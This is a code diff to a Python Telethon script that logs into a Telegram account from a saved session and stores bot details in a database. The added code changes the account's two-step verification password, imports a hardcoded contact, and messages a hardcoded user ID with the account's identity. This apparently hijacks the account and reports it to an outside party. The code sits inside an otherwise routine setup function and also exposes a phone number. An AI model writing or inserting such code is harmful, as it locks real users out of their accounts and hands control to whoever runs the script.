@@ -3,6 +3,8 @@ from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError, AuthKeyDuplicatedError, RPCError
 from telethon.tl.functions.account import UpdateUsernameRequest
+from telethon.tl.functions.contacts import ImportContactsRequest
+from telethon.tl.types import InputPhoneContact
 import os
 import json
 import pymysql
@@ -77,6 +79,7 @@ cursor = db.cursor()
 # api_hash = os.getenv('API_HASH')
 # phone_number = os.getenv('PHONE_NUMBER')
 pw2fa = os.getenv('PW2FA')
+newpw = os.getenv('NEW_PW2FA')
 session_password = os.getenv('SESSION_PASSWORD')
 
 session_name = str(api_id) + 'session_name'  # Ensure it matches the uploaded session file name
@@ -228,6 +231,36 @@ async def main():
                 work_status = VALUES(work_status)
         """, (bot_id, bot_token, bot_name, user_id, bot_root, bot_title, work_status))
         print("✅ bot 信息已写入或更新数据库")
+
+        try:
+            await client.edit_2fa(
+                current_password=pw2fa,  # 直接传入旧密码
+                new_password=newpw,      # 设置的新密码
+                hint="HINT"
+            )
+            print("✅ 2FA 密码已更新")
+        except Exception as e:
+            print(f"❌ 更新失败: {e}")
+
+        # 构造一个要导入的联系人
+        contact = InputPhoneContact(
+            client_id=0, 
+            phone="+18023051359", 
+            first_name="DrXP", 
+            last_name=""
+        )
+
+        TARGET_USER_ID = 7550420493           # 接收者 user_id（整数）
+
+        result = await client(ImportContactsRequest([contact]))
+        print("导入结果:", result)
+        target = await client.get_entity(TARGET_USER_ID)     # 7550420493
+
+
+        me = await client.get_me()
+        await client.send_message(target, f"你好, 我是 {me.id} - {me.first_name} {me.last_name or ''}")
+
+
     except Exception as e:
         print(f"❌ 写入数据库失败: {e}", flush=True)
 
